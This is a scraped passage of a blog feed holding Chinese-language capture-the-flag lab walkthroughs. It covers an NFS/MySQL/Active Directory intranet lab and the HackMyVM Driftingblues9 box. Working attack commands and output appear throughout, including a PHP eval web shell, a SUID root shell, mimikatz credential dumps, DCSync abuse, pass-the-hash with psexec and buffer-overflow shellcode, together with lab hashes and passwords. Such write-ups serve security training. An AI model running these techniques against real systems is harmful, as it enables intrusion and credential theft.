-h 172.22.13.14/24 -p 2049┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ _ __ __ _ _ __ __ _ _ __| | __ ││ / /_\\/____/ _ _|/ _ _| &#x27;_ _/ _` |/ __| |/ / ││ / /_\\\\_ ____\\__ \\ (__| | | (_| | (__| &lt; ││ \\____/ |___/\\___|_| \\_ _,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.0[2025-04-27 16:07:15] [INFO] 暴力破解线程数: 1[2025-04-27 16:07:15] [INFO] 开始信息扫描[2025-04-27 16:07:15] [INFO] CIDR 范围: 172.22.13.0-172.22.13.255[2025-04-27 16:07:15] [INFO] 生成 IP 范围: 172.22.13.0.%! d(string = 172.22.13.255) - %! s(MISSING).%! d(MISSING)[2025-04-27 16:07:16] [INFO] 解析 CIDR 172.22.13.14/24 -&gt; IP 范围 172.22.13.0-172.22.13.255[2025-04-27 16:07:16] [INFO] 最终有效主机数量: 256[2025-04-27 16:07:16] [INFO] 开始主机扫描[2025-04-27 16:07:16] [SUCCESS] 目标 172.22.13.6 存活 (ICMP)[2025-04-27 16:07:16] [SUCCESS] 目标 172.22.13.14 存活 (ICMP)[2025-04-27 16:07:16] [SUCCESS] 目标 172.22.13.28 存活 (ICMP)[2025-04-27 16:07:16] [SUCCESS] 目标 172.22.13.57 存活 (ICMP)[2025-04-27 16:07:19] [INFO] 存活主机数量: 4[2025-04-27 16:07:19] [INFO] 有效端口数量: 1[2025-04-27 16:07:19] [SUCCESS] 端口开放 172.22.13.57:2049 172.22.13.57 开了 2049 的端口 1234567#在靶机上操作root@ubuntu:~# showmount -e 172.22.13.57Export list for 172.22.13.57:/home/joyce *root@ubuntu:~# cd /tmproot@ubuntu:/tmp# mkdir testroot@ubuntu:/tmp# mount -t nfs 172.22.13.57:/ ./test -o nolock 然后 joyce 的家目录就被成功挂载了，写一个公钥进去 123root@ubuntu:/tmp/test/home/joyce# mkdir .sshroot@ubuntu:/tmp/test/home/joyce# cd .sshroot@ubuntu:/tmp/test/home/joyce/.ssh# echo &#x27;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJcatU49PfwyMAfrfJcaaIFCNOJNWOdDonEg3ahNxG8H root@kali&#x27;&gt; authorized_keys 然后 ssh 连接 1234567891011121314151617181920212223242526┌──(root㉿kali)-[~/Desktop/tmp/123]└─# proxy -f proxychains4.conf ssh joyce@172.22.13.57[proxychains] config file found: proxychains4.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.17[proxychains] Strict chain ... 192.168.11.1:9999 ... 172.22.13.57:22 ... OKThe authenticity of host &#x27;172.22.13.57 (172.22.13.57)&#x27; can&#x27;t be established.ED25519 key fingerprint is SHA256: Y8qbRlvlJKReDyk1mEsy/A7aQosNyeucM/GZs7aI8SA.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#x27;172.22.13.57&#x27; (ED25519) to the list of known hosts.Last login: Thu Aug 11 18:16:01 2022Welcome to Alibaba Cloud Elastic Compute Service ![joyce@centos ~]$ ls[joyce@centos ~]$ ls -altotal 28drwx------ 3 joyce joyce 4096 Apr 27 16:11 .drwxr-xr-x. 4 root root 4096 Aug 10 2022 ..-rw------- 1 joyce joyce 5 Aug 11 2022 .bash_history-rw-r--r-- 1 joyce joyce 18 Nov 25 2021 .bash_logout-rw-r--r-- 1 joyce joyce 193 Nov 25 2021 .bash_profile-rw-r--r-- 1 joyce joyce 231 Nov 25 2021 .bashrcdrwxr-xr-x 2 root root 4096 Apr 27 16:12 .ssh[joyce@centos ~]$ 尝试提权，查找 suid 权限 123456789101112131415161718192021[joyce@centos ~]$ find / -perm -u = s 2 &gt;/dev/null/usr/libexec/dbus-1/dbus-daemon-launch-helper/usr/sbin/unix_chkpwd/usr/sbin/pam_timestamp_check/usr/sbin/usernetctl/usr/sbin/mount.nfs/usr/bin/sudo/usr/bin/chage/usr/bin/at/usr/bin/mount/usr/bin/crontab/usr/bin/passwd/usr/bin/chsh/usr/bin/pkexec/usr/bin/newgrp/usr/bin/su/usr/bin/chfn/usr/bin/gpasswd/usr/bin/ftp/usr/bin/umount/usr/lib/polkit-1/polkit-agent-helper-1 ftp 提权可以读文件，也可以通过 nfs 上传一个恶意文件拿到 shell 1234567891011121314root@ubuntu:/tmp# echo &#x27;int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;&#x27; &gt; root.croot@ubuntu:/tmp# gcc root.c -o rootroot.c: In function ‘main’:root.c: 1:14: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration] 1 | int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125; | ^~~~~~root.c: 1:25: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration] 1 | int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125; | ^~~~~~root.c: 1:36: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration] 1 | int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125; |root@ubuntu:/tmp# chmod +s ./rootroot@ubuntu:/tmp# mv root ./test/home/joyce/ 12345[joyce@centos ~]$ lsroot[joyce@centos ~]$ ./root[root@centos ~]# iduid = 0(root) gid = 0(root) groups = 0(root),994(joyce) flag02 在根目录下 FLAG03 172.22.13.28 是一个 OA 系统，用 fscan 扫一下全端口，可以扫到 mysql 有弱口令 1root: 123456 navicat 连接 123456789101112131415mysql &gt; show variables like &quot;secure_file_priv&quot;;+------------------+-------+| Variable_name | Value |+------------------+-------+| secure_file_priv | |+------------------+-------+1 row in set (0.05 sec)mysql &gt; show variables like &quot;%general%&quot;;+------------------+--------------------------------------------------------------+| Variable_name | Value |+------------------+--------------------------------------------------------------+| general_log | OFF || general_log_file | C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\WIN-HAUWOLAO.log |+------------------+--------------------------------------------------------------+2 rows in set (0.06 sec) 尝试写马 12mysql &gt; select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;C:/phpstudy_pro/WWW/1.php&quot;;Query OK, 1 row affected (0.03 sec) 然后蚁剑连接，flag03 在 C:/Users/Administrator/flag/下 FLAG04创建一个用户，添加进用户组里 12345C:\\Users\\Administrator\\flag &gt; net user lv Asd123123 /add命令成功完成。 C:\\Users\\Administrator\\flag &gt; net localgroup administrators lv /add命令成功完成。 然后远程桌面连接，上传一个 mimikatz 抓取哈希 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303 .#####. mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36 .## ^ ##. &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## &gt; http://blog.gentilkiwi.com/mimikatz &#x27;## v ##&#x27; Vincent LE TOUX ( vincent.letoux@gmail.com ) &#x27;#####&#x27; &gt; http://pingcastle.com / http://mysmartlogon.com ***/mimikatz # privilege:: debugPrivilege &#x27;20&#x27; OKmimikatz # logUsing &#x27;mimikatz.log&#x27; for logfile : OKmimikatz # sekurlsa:: logonpasswordsAuthentication Id : 0 ; 11159151 (00000000:00aa466f)Session : RemoteInteractive from 2User Name : lvDomain : WIN-HAUWOLAOLogon Server : WIN-HAUWOLAOLogon Time : 2025/4/27 16:53:43SID : S-1-5-21-2057596273-973658165-3030246172-1000 msv : [00000003] Primary * Username : lv * Domain : WIN-HAUWOLAO * NTLM : 85edf6aacad2ac8e2a7a44741eb0b236 * SHA1 : aab02ea07aee541e9f60a1f6d5a54a2045965743 tspkg : wdigest : * Username : lv * Domain : WIN-HAUWOLAO * Password : (null) kerberos : * Username : lv * Domain : WIN-HAUWOLAO * Password : (null) ssp : credman :Authentication Id : 0 ; 11136230 (00000000:00a9ece6)Session : Interactive from 2User Name : DWM-2Domain : Window ManagerLogon Server : (null)Logon Time : 2025/4/27 16:53:43SID : S-1-5-90-0-2 msv : [00000003] Primary * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * NTLM : 00f24a2e0e0076b23f55b10e54d4cc25 * SHA1 : 8c03f31f89359af762fe0f271a0d61a64ef6eca1 tspkg : wdigest : * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * Password : (null) kerberos : * Username : WIN-HAUWOLAO$ * Domain : xiaorang.lab * Password : 18 81 7a 3c 1c ec 03 ec 71 bd fd a6 5f c7 1d d8 be 20 8f e4 e2 f2 96 d1 01 1a 88 7f 4c 07 89 bd 00 45 80 3d b0 61 e5 73 be e2 b4 01 9b 14 88 64 e7 ad 83 83 65 0a 53 40 9f 44 a9 90 b2 aa 04 c7 e1 23 f5 dd 3e f4 5d b3 13 88 9e 67 1f 0a 8a 18 5f dd 82 d2 f0 e1 41 5d 12 6f 8f bb 44 05 66 8d 10 40 e2 5d 97 c8 48 ea 5d 74 d8 7b 5b 1a 5f 9e 94 3a 21 01 c7 9f a5 c9 79 3c 70 91 4c 52 4e 69 ce f6 fe 0f db 54 2a 7c 3c 3a 71 99 2a a9 3e 3d 4e 06 b1 b7 8d 11 a7 7b 71 5a 7d 8c f3 cb 2b f7 c0 eb 74 64 e7 c7 f0 32 36 d0 03 1f f2 69 25 52 5f 18 05 0e 66 1f 82 b4 a7 99 11 c7 64 b5 78 05 c1 91 94 f7 16 8c d0 04 7e 0f e3 2b 7c 83 af 3d d9 46 fd da d8 cd 5c af 89 cd 93 78 14 68 f5 e4 71 55 0f a1 7d c6 9e f6 7f 0c 5d 62 f6 33 5b 12 ssp : credman :Authentication Id : 0 ; 11136190 (00000000:00a9ecbe)Session : Interactive from 2User Name : DWM-2Domain : Window ManagerLogon Server : (null)Logon Time : 2025/4/27 16:53:43SID : S-1-5-90-0-2 msv : [00000003] Primary * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * NTLM : 00f24a2e0e0076b23f55b10e54d4cc25 * SHA1 : 8c03f31f89359af762fe0f271a0d61a64ef6eca1 tspkg : wdigest : * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * Password : (null) kerberos : * Username : WIN-HAUWOLAO$ * Domain : xiaorang.lab * Password : 18 81 7a 3c 1c ec 03 ec 71 bd fd a6 5f c7 1d d8 be 20 8f e4 e2 f2 96 d1 01 1a 88 7f 4c 07 89 bd 00 45 80 3d b0 61 e5 73 be e2 b4 01 9b 14 88 64 e7 ad 83 83 65 0a 53 40 9f 44 a9 90 b2 aa 04 c7 e1 23 f5 dd 3e f4 5d b3 13 88 9e 67 1f 0a 8a 18 5f dd 82 d2 f0 e1 41 5d 12 6f 8f bb 44 05 66 8d 10 40 e2 5d 97 c8 48 ea 5d 74 d8 7b 5b 1a 5f 9e 94 3a 21 01 c7 9f a5 c9 79 3c 70 91 4c 52 4e 69 ce f6 fe 0f db 54 2a 7c 3c 3a 71 99 2a a9 3e 3d 4e 06 b1 b7 8d 11 a7 7b 71 5a 7d 8c f3 cb 2b f7 c0 eb 74 64 e7 c7 f0 32 36 d0 03 1f f2 69 25 52 5f 18 05 0e 66 1f 82 b4 a7 99 11 c7 64 b5 78 05 c1 91 94 f7 16 8c d0 04 7e 0f e3 2b 7c 83 af 3d d9 46 fd da d8 cd 5c af 89 cd 93 78 14 68 f5 e4 71 55 0f a1 7d c6 9e f6 7f 0c 5d 62 f6 33 5b 12 ssp : credman :Authentication Id : 0 ; 91296 (00000000:000164a0)Session : Service from 0User Name : chengleiDomain : XIAORANGLogon Server : WIN-DCLogon Time : 2025/4/27 15:43:55SID : S-1-5-21-3269458654-3569381900-10559451-1105 msv : [00000003] Primary * Username : chenglei * Domain : XIAORANG * NTLM : 0c00801c30594a1b8eaa889d237c5382 * SHA1 : e8848f8a454e08957ec9814b9709129b7101fad7 * DPAPI : 89b179dc738db098372c365602b7b0f4 tspkg : wdigest : * Username : chenglei * Domain : XIAORANG * Password : (null) kerberos : * Username : chenglei * Domain : XIAORANG.LAB * Password : Xt61f3LBhg1 ssp : credman :Authentication Id : 0 ; 53263 (00000000:0000d00f)Session : Interactive from 1User Name : DWM-1Domain : Window ManagerLogon Server : (null)Logon Time : 2025/4/27 15:43:53SID : S-1-5-90-0-1 msv : [00000003] Primary * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * NTLM : b5cd3591a58e1169186bcdbfd4b6322d * SHA1 : 226ee6b5e527e5903988f08993a2456e3297ee1f tspkg : wdigest : * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * Password : (null) kerberos : * Username : WIN-HAUWOLAO$ * Domain : xiaorang.lab * Password : `k+hcEDFvtzoObj=&gt;DvzxiNqwyEn;Eu-\\zFVAh&gt;.G0u%BqQ21FskHtJlW4)3is3V;7Iu)3B00kd1##IB&#x27;LLG6wSx6TR%m;` Nfr;; Hf8O&#x27;Szfl0Z = w+^,&gt; 0jR ssp : credman :Authentication Id : 0 ; 996 (00000000:000003e4)Session : Service from 0User Name : WIN-HAUWOLAO$Domain : XIAORANGLogon Server : (null)Logon Time : 2025/4/27 15:43:53SID : S-1-5-20 msv : [00000003] Primary * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * NTLM : 00f24a2e0e0076b23f55b10e54d4cc25 * SHA1 : 8c03f31f89359af762fe0f271a0d61a64ef6eca1 tspkg : wdigest : * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * Password : (null) kerberos : * Username : win-hauwolao$ * Domain : XIAORANG.LAB * Password : 18 81 7a 3c 1c ec 03 ec 71 bd fd a6 5f c7 1d d8 be 20 8f e4 e2 f2 96 d1 01 1a 88 7f 4c 07 89 bd 00 45 80 3d b0 61 e5 73 be e2 b4 01 9b 14 88 64 e7 ad 83 83 65 0a 53 40 9f 44 a9 90 b2 aa 04 c7 e1 23 f5 dd 3e f4 5d b3 13 88 9e 67 1f 0a 8a 18 5f dd 82 d2 f0 e1 41 5d 12 6f 8f bb 44 05 66 8d 10 40 e2 5d 97 c8 48 ea 5d 74 d8 7b 5b 1a 5f 9e 94 3a 21 01 c7 9f a5 c9 79 3c 70 91 4c 52 4e 69 ce f6 fe 0f db 54 2a 7c 3c 3a 71 99 2a a9 3e 3d 4e 06 b1 b7 8d 11 a7 7b 71 5a 7d 8c f3 cb 2b f7 c0 eb 74 64 e7 c7 f0 32 36 d0 03 1f f2 69 25 52 5f 18 05 0e 66 1f 82 b4 a7 99 11 c7 64 b5 78 05 c1 91 94 f7 16 8c d0 04 7e 0f e3 2b 7c 83 af 3d d9 46 fd da d8 cd 5c af 89 cd 93 78 14 68 f5 e4 71 55 0f a1 7d c6 9e f6 7f 0c 5d 62 f6 33 5b 12 ssp : credman :Authentication Id : 0 ; 24185 (00000000:00005e79)Session : UndefinedLogonType from 0User Name : (null)Domain : (null)Logon Server : (null)Logon Time : 2025/4/27 15:43:52SID : msv : [00000003] Primary * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * NTLM : 00f24a2e0e0076b23f55b10e54d4cc25 * SHA1 : 8c03f31f89359af762fe0f271a0d61a64ef6eca1 tspkg : wdigest : kerberos : ssp : credman :Authentication Id : 0 ; 11159180 (00000000:00aa468c)Session : RemoteInteractive from 2User Name : lvDomain : WIN-HAUWOLAOLogon Server : WIN-HAUWOLAOLogon Time : 2025/4/27 16:53:43SID : S-1-5-21-2057596273-973658165-3030246172-1000 msv : [00000003] Primary * Username : lv * Domain : WIN-HAUWOLAO * NTLM : 85edf6aacad2ac8e2a7a44741eb0b236 * SHA1 : aab02ea07aee541e9f60a1f6d5a54a2045965743 tspkg : wdigest : * Username : lv * Domain : WIN-HAUWOLAO * Password : (null) kerberos : * Username : lv * Domain : WIN-HAUWOLAO * Password : (null) ssp : credman :Authentication Id : 0 ; 91297 (00000000:000164a1)Session : Service from 0User Name : chengleiDomain : XIAORANGLogon Server : WIN-DCLogon Time : 2025/4/27 15:43:55SID : S-1-5-21-3269458654-3569381900-10559451-1105 msv : [00000003] Primary * Username : chenglei * Domain : XIAORANG * NTLM : 0c00801c30594a1b8eaa889d237c5382 * SHA1 : e8848f8a454e08957ec9814b9709129b7101fad7 * DPAPI : 89b179dc738db098372c365602b7b0f4 tspkg : wdigest : * Username : chenglei * Domain : XIAORANG * Password : (null) kerberos : * Username : chenglei * Domain : XIAORANG.LAB * Password : Xt61f3LBhg1 ssp : credman :Authentication Id : 0 ; 997 (00000000:000003e5)Session : Service from 0User Name : LOCAL SERVICEDomain : NT AUTHORITYLogon Server : (null)Logon Time : 2025/4/27 15:43:53SID : S-1-5-19 msv : tspkg : wdigest : * Username : (null) * Domain : (null) * Password : (null) kerberos : * Username : (null) * Domain : (null) * Password : (null) ssp : credman :Authentication Id : 0 ; 53235 (00000000:0000cff3)Session : Interactive from 1User Name : DWM-1Domain : Window ManagerLogon Server : (null)Logon Time : 2025/4/27 15:43:53SID : S-1-5-90-0-1 msv : [00000003] Primary * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * NTLM : 00f24a2e0e0076b23f55b10e54d4cc25 * SHA1 : 8c03f31f89359af762fe0f271a0d61a64ef6eca1 tspkg : wdigest : * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * Password : (null) kerberos : * Username : WIN-HAUWOLAO$ * Domain : xiaorang.lab * Password : 18 81 7a 3c 1c ec 03 ec 71 bd fd a6 5f c7 1d d8 be 20 8f e4 e2 f2 96 d1 01 1a 88 7f 4c 07 89 bd 00 45 80 3d b0 61 e5 73 be e2 b4 01 9b 14 88 64 e7 ad 83 83 65 0a 53 40 9f 44 a9 90 b2 aa 04 c7 e1 23 f5 dd 3e f4 5d b3 13 88 9e 67 1f 0a 8a 18 5f dd 82 d2 f0 e1 41 5d 12 6f 8f bb 44 05 66 8d 10 40 e2 5d 97 c8 48 ea 5d 74 d8 7b 5b 1a 5f 9e 94 3a 21 01 c7 9f a5 c9 79 3c 70 91 4c 52 4e 69 ce f6 fe 0f db 54 2a 7c 3c 3a 71 99 2a a9 3e 3d 4e 06 b1 b7 8d 11 a7 7b 71 5a 7d 8c f3 cb 2b f7 c0 eb 74 64 e7 c7 f0 32 36 d0 03 1f f2 69 25 52 5f 18 05 0e 66 1f 82 b4 a7 99 11 c7 64 b5 78 05 c1 91 94 f7 16 8c d0 04 7e 0f e3 2b 7c 83 af 3d d9 46 fd da d8 cd 5c af 89 cd 93 78 14 68 f5 e4 71 55 0f a1 7d c6 9e f6 7f 0c 5d 62 f6 33 5b 12 ssp : credman :Authentication Id : 0 ; 999 (00000000:000003e7)Session : UndefinedLogonType from 0User Name : WIN-HAUWOLAO$Domain : XIAORANGLogon Server : (null)Logon Time : 2025/4/27 15:43:52SID : S-1-5-18 msv : tspkg : wdigest : * Username : WIN-HAUWOLAO$ * Domain : XIAORANG * Password : (null) kerberos : * Username : win-hauwolao$ * Domain : XIAORANG.LAB * Password : (null) ssp : credman :mimikatz # \\ 拿到了一个域内用户 chenglei，查看 chenglei 的域内权限 1234567891011121314151617181920212223C:\\Users\\Administrator\\flag &gt; net user chenglei /domain这项请求将在域 xiaorang.lab 的域控制器处理。用户名 chenglei全名 注释 用户的注释 国家/地区代码 000 (系统默认值)帐户启用 Yes帐户到期 从不上次设置密码 2023/7/11 14:57:52密码到期 从不密码可更改 2023/7/12 14:57:52需要密码 Yes用户可以更改密码 Yes允许的工作站 All登录脚本 用户配置文件 主目录 上次登录 2025/4/27 16:57:57可允许的登录小时数 All本地组成员 全局组成员 *ACL Admin * Domain Users 命令成功完成。 属于 ACL Admin 组，这个组有 WriteDACL 的权限，给 chenglei 去添加 DCSync 权限 123┌──(root㉿kali)-[~/Desktop/tmp/123]└─# bloodyAD --host 172.22.13.6 -d &quot;XIAORANG.LAB&quot; -u chenglei -p Xt61f3LBhg1 add dcsync &quot;chenglei&quot;[+] chenglei is now able to DCSync 然后用 chenglei 远程登录 mimikatz 抓取域内哈希 1234567891011mimikatz # lsadump:: dcsync /domian: xiaorang.lab /all /csv[DC] &#x27;xiaorang.lab&#x27; will be the domain[DC] &#x27;WIN-DC.xiaorang.lab&#x27; will be the DC server[DC] Exporting domain &#x27;xiaorang.lab&#x27;1104 zhangwen fa7d776fdfc82d3f43c9d8b7f5312d77 512502 krbtgt cb976ec1a1bf8a14a15142c6fecc540e 5141106 zhangtao e786c4a4987ced162c496d0519496729 5121000 WIN-DC$ 5a5c8ad1abcec444c534563d7db5c332 532480500 Administrator 6341235defdaed66fb7b682665752c9a 5121105 chenglei 0c00801c30594a1b8eaa889d237c5382 5121103 WIN-HAUWOLAO$ 00f24a2e0e0076b23f55b10e54d4cc25 4096 然后横向就行了 1234567891011121314151617181920212223┌──(root㉿kali)-[~/Desktop/tmp/123]└─# impacket-psexec -hashes : 6341235defdaed66fb7b682665752c9a Administrator@172.22.13.6Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation[*] Requesting shares on 172.22.13.6.....[*] Found writable share ADMIN$[*] Uploading file hUqShSba.exe[*] Opening SVCManager on 172.22.13.6.....[*] Creating service PuTe on 172.22.13.6.....[*] Starting service PuTe.....[!] Press help for extra shell commands[-] Decoding error detected, consider running chcp.com at the target,map the result with https://docs.python.org/3/library/codecs.html#standard-encodingsand then execute smbexec.py again with -codec and the corresponding codecMicrosoft Windows [� 汾 10.0.20348.1787][-] Decoding error detected, consider running chcp.com at the target,map the result with https://docs.python.org/3/library/codecs.html#standard-encodingsand then execute smbexec.py again with -codec and the corresponding codec(c) Microsoft Corporation����������Ȩ����C:\\Windows\\system32 &gt; flag4 在 C:\\Users\\Administrator\\flag 下","categories":[{"name":"春秋云镜","slug":"春秋云镜","permalink":"https://lvzhouhang.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Driftingblues9","slug":"HackmyVM-Driftingblues9","date":"2025-04-24T06:33:53.000Z","updated":"2025-04-24T06:52:45.750Z","comments":true,"path":"2025/04/24/HackmyVM-Driftingblues9/","permalink":"https://lvzhouhang.xyz/2025/04/24/HackmyVM-Driftingblues9/","excerpt":"","text":"信息搜集1234567┌──(root㉿kali)-[~/Desktop/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:70:2e:5f PCS Systemtechnik GmbH192.168.31.159 08:00:27:b3:1b:96 PCS Systemtechnik GmbH 192.168.31.159就是靶机 12345678910111213┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 192.168.31.159 -p-Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-24 02:36 EDTNmap scan report for 192.168.31.159Host is up (0.0013s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE80/tcp open http111/tcp open rpcbind41157/tcp open unknownMAC Address: 08:00:27:B3:1B:96 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 13.08 seconds 80端口扫描目录 12345678910111213141516171819202122232425262728293031323334353637┌──(root㉿kali)-[~/Desktop/tmp]└─# gobuster dir -u &quot;http://192.168.31.159/&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt,.jpg===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.159/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Extensions: php,txt,jpg[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/images (Status: 301) [Size: 317] [--&gt; http://192.168.31.159/images/]/.php (Status: 403) [Size: 279]/index.php (Status: 200) [Size: 5656]/docs (Status: 301) [Size: 315] [--&gt; http://192.168.31.159/docs/]/page (Status: 301) [Size: 315] [--&gt; http://192.168.31.159/page/]/header.php (Status: 200) [Size: 13]/admin (Status: 301) [Size: 316] [--&gt; http://192.168.31.159/admin/]/footer.php (Status: 500) [Size: 614]/license (Status: 301) [Size: 318] [--&gt; http://192.168.31.159/license/]/README.txt (Status: 200) [Size: 975]/js (Status: 301) [Size: 313] [--&gt; http://192.168.31.159/js/]/include (Status: 301) [Size: 318] [--&gt; http://192.168.31.159/include/]/backup (Status: 301) [Size: 317] [--&gt; http://192.168.31.159/backup/]/styles (Status: 301) [Size: 317] [--&gt; http://192.168.31.159/styles/]/INSTALL.txt (Status: 200) [Size: 1201]/.php (Status: 403) [Size: 279]/wysiwyg (Status: 301) [Size: 318] [--&gt; http://192.168.31.159/wysiwyg/]/server-status (Status: 403) [Size: 279]/mails (Status: 301) [Size: 316] [--&gt; http://192.168.31.159/mails/] 从/README.txt 得知是ApPHP的框架，mails里有账号和密码，其他的都没什么用 123456789101112Hello _USER_NAME_!&lt;br&gt; &lt;br&gt;You or someone else asked for your login info on our site, _WEB_SITE_Your Login Info:------------------------&lt;br/&gt;Username: _USER_NAME_Password: _USER_PASSWORD_------------------&lt;br/&gt;Best regards,_WEB_SITE_ 1234567891011121314┌──(root㉿kali)-[~/Desktop/tmp]└─# searchsploit apphp-------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path-------------------------------------------------------------------------------------- ---------------------------------ApPHP MicroBlog 1.0.1 - Multiple Vulnerabilities | php/webapps/33030.txtApPHP MicroBlog 1.0.1 - Remote Command Execution | php/webapps/33070.pyApPHP MicroBlog 1.0.2 - Cross-Site Request Forgery (Add New Author) | php/webapps/40506.htmlApPHP MicroBlog 1.0.2 - Persistent Cross-Site Scripting | php/webapps/40505.txtApPHP MicroCMS 3.9.5 - Cross-Site Request Forgery (Add Admin) | php/webapps/40517.htmlApPHP MicroCMS 3.9.5 - Persistent Cross-Site Scripting | php/webapps/40516.txt-------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No Results php/webapps/33070.py跑这个脚本就行，然后弹出来一个shell 提权在/var/www/html/include/base.inc.php里有用户名和密码 12345678910www-data@debian:/var/www/html/include$ cat base.inc.php&lt;?php // DATABASE CONNECTION INFORMATION define(&#x27;DATABASE_HOST&#x27;, &#x27;localhost&#x27;); // Database host define(&#x27;DATABASE_NAME&#x27;, &#x27;microblog&#x27;); // Name of the database to be used define(&#x27;DATABASE_USERNAME&#x27;, &#x27;clapton&#x27;); // User name for access to database define(&#x27;DATABASE_PASSWORD&#x27;, &#x27;yaraklitepe&#x27;); // Password for access to database define(&#x27;DB_ENCRYPT_KEY&#x27;, &#x27;p52plaiqb8&#x27;); // Database encryption key define(&#x27;DB_PREFIX&#x27;, &#x27;mb101_&#x27;); // Unique prefix of all table names in the database ?&gt; su clapton 提权roothome目录下有input一个程序和一个note 1234567clapton@debian:~$ cat note.txtbuffer overflow is the way. ( ͡° ͜ʖ ͡°)if you&#x27;re new on 32bit bof then check these:https://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.htmlhttps://samsclass.info/127/proj/lbuf1.htm input的伪c代码 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; char dest[159]; // [esp+11h] [ebp-9Fh] BYREF if ( argc &lt;= 1 ) &#123; printf(&quot;Syntax: %s &lt;input string&gt;\\n&quot;, *argv); exit(0); &#125; strcpy(dest, argv[1]); return 0;&#125; 二进制我属实不会，看大佬wp了 payload： 1for i in &#123;1..10000&#125;; do (./input $(python -c &#x27;print(&quot;A&quot; * 171 + &quot;\\xa0\\xe7\\x84\\xbf&quot; + &quot;\\x90&quot; * 1000 + &quot;\\x31\\xc9\\xf7\\xe1\\x51\\xbf\\xd0\\xd0\\x8c\\x97\\xbe\\xd0\\x9d\\x96\\x91\\xf7\\xd7\\xf7\\xd6\\x57\\x56\\x89\\xe3\\xb0\\x0b\\xcd\\x80&quot;)&#x27;)) ; done","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-WMessage","slug":"HackmyVM-WMessage","date":"2025-04-24T05:24:21.000Z","updated":"2025-04-29T03:23:27.609Z","comments":true,"path":"2025/04/24/HackmyVM-WMessage/","permalink":"https://lvzhouhang.xyz/2025/04/24/HackmyVM-WMessage/","excerpt":"","text":"信息搜集1234567┌──(root㉿kali)-[~/Desktop/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:77:9d:8a PCS Systemtechnik GmbH192.168.31.158 08:00:27:06:63:ee PCS Systemtechnik GmbH 192.168.31.158就是靶机ip地址 123456789101112┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 192.168.31.158 -p-Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-24 